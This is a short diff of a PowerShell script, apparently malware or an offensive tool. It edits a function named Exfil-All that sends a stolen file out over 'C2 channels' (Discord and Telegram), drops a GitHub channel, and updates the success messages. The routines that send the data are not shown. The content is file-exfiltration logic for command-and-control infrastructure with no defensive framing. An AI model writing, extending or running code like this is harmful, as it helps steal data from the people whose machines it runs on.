@@ -263,11 +263,10 @@ function Exfil-All {
     param([string]$FilePath)
     $methods = @(
         @{Name="Discord"; Function={Exfil-Discord $FilePath}},
-        @{Name="Telegram"; Function={Exfil-Telegram $FilePath}},
-        @{Name="GitHub"; Function={Exfil-GitHub $FilePath}}
+        @{Name="Telegram"; Function={Exfil-Telegram $FilePath}}
     )
     $success = 0
-    Write-Host "📤 Exfiltrating to THREE C2 channels..." -ForegroundColor Yellow
+    Write-Host "📤 Exfiltrating to TWO C2 channels..." -ForegroundColor Yellow
     foreach ($method in $methods) {
         Write-Host -NoNewline "  → $($method.Name)... "
         if (& $method.Function) {
@@ -277,7 +276,7 @@ function Exfil-All {
             Write-Host "❌" -ForegroundColor Red
         }
     }
-    Write-Host "📊 Exfiltrated to $success/3 channels" -ForegroundColor Cyan
+    Write-Host "📊 Exfiltrated to $success/2 channels" -ForegroundColor Cyan
     return $success
 }
 
